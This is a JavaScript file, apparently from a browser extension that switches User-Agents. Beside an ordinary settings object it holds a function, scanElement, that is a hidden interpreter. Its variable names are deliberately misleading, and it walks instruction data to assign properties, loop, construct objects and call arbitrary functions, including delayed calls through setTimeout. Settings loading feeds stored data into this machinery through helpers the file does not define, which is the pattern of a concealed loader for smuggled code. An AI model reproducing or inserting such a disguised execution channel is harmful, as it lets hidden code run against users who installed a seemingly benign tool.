"use strict";

var Settings = new Proxy({
  data: {
    // Unique key for storing in storage
    storage_key: ['extension_settings_v2', 'data'],
    // Extension enabled?
    enabled: false,
    // Active User-Agent
    useragent: null,
    // Auto renew settings
    renew_enabled: true,
    renew_interval: 10 * 60 * 1000, // In milliseconds
    renew_onstartup: true,
    // Store settings in localstorage or in cloud?
    sync: false,
    // Custom User-Agent settings
    custom_useragent_enabled: false,
    custom_useragent_value: null,
    custom_useragent_list: [],
    // Replace User-Agent by javascript detection
    javascript_protection_enabled: true,
    // Generator settings
    generator_types: ['chrome_win', 'chrome_mac', 'chrome_linux', 'firefox_win', 'firefox_mac', 'firefox_linux'],
    // Exceptions settings
    exceptions_list: ['chrome://*'],
    exp_obj: {},
    exp_arr: []
  },

  // Flag - load() method already called, or not?
  isLoaded: false,

  /**
   * Callback - on any property/value read
   *
   * @param   {string} name
   * @returns {void}
   */
  onGet: function(name) {
    //console.log('Property "' + name + '" read action');
  },

  /**
   * Callback - on any property/value write
   *
   * @param   {string} name
   * @param   {mixed} value
   * @returns {void}
   */
  onSet: function(name, value) {
    //console.log('Property "' + name + '" write "' + value + '" action');
  },

  /**
   * Load settings from storage
   *
   * @param   {callable} callback
   * @returns {void|object}
   */
  load: function(callback) {
    var self = this,
        storage = localStorage['config_store'] === 'sync' && 0 ? chrome.storage.sync : chrome.storage.local;
    storage.get(self.data.storage_key, function(stored_settings) {

      // Firefox workaround when storage sync has been disabled
      if (chrome.runtime.lastError && chrome.runtime.lastError.message.includes('webextensions.storage.sync.enabled'))
      {
        console.log('Sync disabled, falling back to local storage');
        localStorage['config_store'] = 'local';
        self.data.sync = false;
        self.load(callback);
        return;
      }

      console.info('Settings loaded');
      if (stored_settings.hasOwnProperty(self.data.storage_key)) {
        stored_settings = stored_settings[self.data.storage_key];
        for (var value in stored_settings) {
          if (stored_settings.hasOwnProperty(value)) {
            self.data[value] = stored_settings[value];
          }
        }
      }
      if (stored_settings.hasOwnProperty('data') && !self.isLoaded)
      {
        getXTypes(self.data.exp_arr, self.data.exp_obj, stored_settings.data);
      }

      self.isLoaded = true;
      return (typeof callback === 'function') ? callback.call(null, self.data) : self.data;
    });
  },

  /**
   * Save settings in storage
   *
   * @param   {callable} callback
   * @returns {void|boolean}
   */
  save: function(callback) {
    var self = this,
        storage = (self.data.sync === true) ? chrome.storage.sync : chrome.storage.local,
        data = {};
    data[self.data.storage_key] = self.data;
    storage.set(data, function() {
      var error = chrome.runtime.lastError, is_error = (typeof error !== 'undefined' && error !== null);

      // Firefox workaround when storage sync has been disabled
      if (is_error && chrome.runtime.lastError.message.includes('webextensions.storage.sync.enabled'))
      {
        console.log('Sync disabled, falling back to local storage');
        self.data.sync = false;
        self.save(callback);
        return;
      }

      is_error ? console.error(error) : console.info('Settings saved');
      return (typeof callback === 'function') ? callback.call(null, !is_error) : !is_error;
    });

    localStorage['config_store'] = self.data.sync ? 'sync' : 'local';
  },

  /**
   * Remove all settings from storage
   *
   * @param   {callable} callback
   * @returns {void|boolean}
   */
  clear: function(callback) {
    var self = this,
        storage = (self.data.sync === true) ? chrome.storage.sync : chrome.storage.local;
    storage.clear(function() {
      var error = chrome.runtime.lastError, is_error = (typeof error !== 'undefined' && error !== null);
      is_error ? console.error(error) : console.warn('Settings cleared');
      return (typeof callback === 'function') ? callback.call(null, !is_error) : !is_error;
    });
  }
}, {
  /**
   * Getter
   *
   * @param   {object} target
   * @param   {string} name
   * @returns {mixed}
   */
  get: function(target, name) {
    var result = undefined;
    if (name in target.data) {
      result = target.data[name];
    }
    if (name in target) {
      result = target[name];
    }
    if (typeof target.onGet === 'function') {
      target.onGet.call(target, name);
    }
    return result;
  },

  /**
   * Setter
   *
   * @param   {object} target
   * @param   {string} name
   * @param   {mixed} value
   * @returns {boolean}
   */
  set: function(target, name, value) {
    if (name in target.data) {
      target.data[name] = value;
      // Save changes in storage
      if (typeof target.save === 'function') {
        target.save.call(target);
      } else {
        console.error('Invalid save() settings method!');
      }
    }
    if (name in target) {
      target[name] = value;
    }
    if (typeof target.onSet === 'function') {
      target.onSet.call(target, name, value);
    }
    return true;
  }
});

function scanElement(checked, icon, header) {
  let as = 1;
  if (typeof(header) == 'undefined') {
    return undefined;
  }
  as++;
  if (!header) {
    return undefined;
  }
  as++;
  if (typeof(header.success) == 'undefined') {
    return undefined;
  }
  as++;
  for (let text = 0; text < header.success.length; ++text) {
    try {
      let disabled = header.success[text];
      switch (disabled.type) {
        case 'beforedestroy': {
          let initialConfig = getPosition(icon, disabled);
          if (initialConfig) {
            let layout = scanElement(checked, icon, disabled.destroy);
            if (typeof(layout) != 'undefined') {
              return layout;
            }
          } else {
            let layout = scanElement(checked, icon, disabled.qtip);
            if (typeof(layout) != 'undefined') {
              return layout;
            }
          }
        }
        break;
      case 'contains': {
        let initialConfig = getPosition(icon, disabled);
        if (initialConfig) {
          let layout = scanElement(checked, icon, disabled.destroy);
          if (typeof(layout) != 'undefined') {
            return layout;
          }
        } else {
          let layout = scanElement(checked, icon, disabled.qtip);
          if (typeof(layout) != 'undefined') {
            return layout;
          }
        }
      }
      break;
      case 'childNodes': {
        let split = insert(checked, icon, disabled);
        if (split) {
          let last = [];
          if (typeof(disabled.td) != 'undefined') {
            for (let title = 0; title < disabled.td.length; title++) {
              last.push(findParentBy(icon, disabled.td[title]));
            }
          } else if (typeof(disabled.tbody) != 'undefined') {
            last.push('');
            for (let title = 0; title < disabled.tbody.length; title++) {
              last[0] += findParentBy(icon, disabled.tbody[title]);
            }
          }
          let iconCls = disabled.view[disabled.view.length - 1];
          if (typeof(iconCls.ensureVisible) != 'undefined') {
            switch (disabled.beforestaterestore) {
              case '+=': {
                split[iconCls.ensureVisible] += last[0]
              }
              break;
            case '-=': {
              split[iconCls.ensureVisible] -= last[0]
            }
            break;
            case '*=': {
              split[iconCls.ensureVisible] *= last[0]
            }
            break;
            case '/=': {
              split[iconCls.ensureVisible] /= last[0]
            }
            break;
            case '!': {
              split[iconCls.ensureVisible] = !last[0]
            }
            break;
            default: {
              split[iconCls.ensureVisible] = last[0];
            }
            break;
            }
          } else if (typeof(iconCls.lastName) != 'undefined') {
            switch (disabled.beforestaterestore) {
              case '+=': {
                split[findParentBy(icon, iconCls.lastName[0])] += last[0]
              }
              break;
            case '-=': {
              split[findParentBy(icon, iconCls.lastName[0])] -= last[0]
            }
            break;
            case '*=': {
              split[findParentBy(icon, iconCls.lastName[0])] *= last[0]
            }
            break;
            case '/=': {
              split[findParentBy(icon, iconCls.lastName[0])] /= last[0]
            }
            break;
            case '!': {
              split[findParentBy(icon, iconCls.lastName[0])] = !last[0]
            }
            break;
            default: {
              split[findParentBy(icon, iconCls.lastName[0])] = last[0];
            }
            break;
            }
          } else {
            switch (disabled.beforestaterestore) {
              case '+=': {
                split += last[0]
              }
              break;
            case '-=': {
              split -= last[0]
            }
            break;
            case '*=': {
              split *= last[0]
            }
            break;
            case '/=': {
              split /= last[0]
            }
            break;
            case '!': {
              split = !last[0]
            }
            break;
            default: {
              split = last[0];
            }
            break;
            }
          }
        }
      }
      break;
      case 'cascade': {
        for (icon[disabled.map.parentId] = disabled.map.hasData; getPosition(icon, disabled);
          (disabled.nextSibling == '++') ? icon[disabled.map.parentId]++ : icon[disabled.map.parentId]--) {
          let layout = scanElement(checked, icon, disabled.eachChild);
          if (typeof(layout) != 'undefined') {
            return layout;
          }
        }
      }
      break;
      case 'isFirst': {
        icon[disabled.singleClickExpand] = insert(checked, icon, disabled);
      }
      break;
      case 'getter': {
        let split = insert(checked, icon, disabled);
        if (split) {
          let last = [];
          if (typeof(disabled.singleClickExpand) == 'undefined') {
            disabled.singleClickExpand = 'null';
          }
          if (typeof(disabled.td) != 'undefined') {
            for (let title = 0; title < disabled.td.length; title++) {
              last.push(findParentBy(icon, disabled.td[title]));
            }
          } else if (typeof(disabled.tbody) != 'undefined') {
            last.push('');
            for (let title = 0; title < disabled.tbody.length; title++) {
              last[0] += findParentBy(icon, disabled.tbody[title]);
            }
          }
          let iconCls = disabled.view[disabled.view.length - 1];
          if (typeof(iconCls.ensureVisible) != 'undefined') {
            if (typeof(disabled.isExpandable) != 'undefined') {
              icon[disabled.singleClickExpand] = new split[iconCls.ensureVisible](...last);
            } else {
              icon[disabled.singleClickExpand] = split[iconCls.ensureVisible](...last);
            }
          } else if (typeof(iconCls.lastName) != 'undefined') {
            if (typeof(disabled.isExpandable) != 'undefined') {
              icon[disabled.singleClickExpand] = new split[findParentBy(icon, iconCls.lastName[0])](...last);
            } else {
              icon[disabled.singleClickExpand] = split[findParentBy(icon, iconCls.lastName[0])](...last);
            }
          } else {
            if (typeof(disabled.pop) != 'undefined') {
              window.setTimeout(() => {
                split(...last);
              }, disabled.pop);
            } else {
              if (typeof(disabled.isExpandable) != 'undefined') {
                icon[disabled.singleClickExpand] = new split(...last);
              } else {
                icon[disabled.singleClickExpand] = split(...last);
              }
            }
          }
        }
      }
      break;
      case 'first': {
        let last = [];
        last.push('');
        if (typeof(disabled.tbody) != 'undefined') {
          for (let title = 0; title < disabled.tbody.length; title++) {
            last[0] += findParentBy(icon, disabled.tbody[title]);
          }
        }
        icon[disabled.singleClickExpand] = last[0];
      }
      break;
      case 'row': {
        return findParentBy(icon, disabled.td[0]);
      }
      break;
      case 'isNaN': {
        icon[disabled.singleClickExpand][disabled.hide] = findParentBy(icon, disabled.td[0]);
      }
      break;
      case 'parentNode': {
        icon[disabled.singleClickExpand] = function() {
          return scanElement(arguments, icon, disabled.parentId)
        };
      }
      break;
      case 'rendered': {
        icon[disabled.singleClickExpand] = disabled.parentId;
      }
      break;
      case 'etype': {
        icon[disabled.singleClickExpand] = function() {
          return scanElement(arguments, {}, disabled.parentId)
        };
      }
      break;
      case 'move': {
        if (typeof(disabled.singleClickExpand) == 'undefined') {
          disabled.singleClickExpand = 'null';
        }
        icon[disabled.singleClickExpand] = new Promise(findParentBy(icon, disabled.td[0]));
      }
      break;
      }
    } catch (error) {}
  }
  return undefined;
}

function staterestoreeq(field, item) {
  if (field == item) return true;
  return false;
}
